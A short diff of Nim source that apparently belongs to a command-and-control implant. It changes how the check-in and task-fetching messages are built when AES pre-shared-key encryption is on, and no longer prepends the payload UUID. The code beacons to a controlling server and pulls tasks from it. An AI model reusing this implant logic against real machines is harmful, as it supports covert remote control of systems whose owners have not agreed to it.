@@ -22,7 +22,7 @@ proc getTasks* : Future[seq[Task]] {.async.} =
     var tasks: seq[Task]
     let taskJson = %*{"action" : "get_tasking", "tasking_size": -1 }
     debugMsg("Attempting to get tasks")
-    let data = when defined(AESPSK): curConfig.PayloadUUID & $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
+    let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
     debugMsg("attempting to get tasks with this data: " & data)
     let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
     debugMsg("decoded temp: " & temp)
@@ -44,7 +44,7 @@ proc checkIn: Future[bool] {.async.} =
     var check = createCheckIn(curConfig)
     debugMsg("Checkin has been created: ", $(check))
 
-    let data = when defined(AESPSK): curConfig.PayloadUUID & checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
+    let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
     try:
         # Send initial checkin and parse json response into JsonNode
         let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
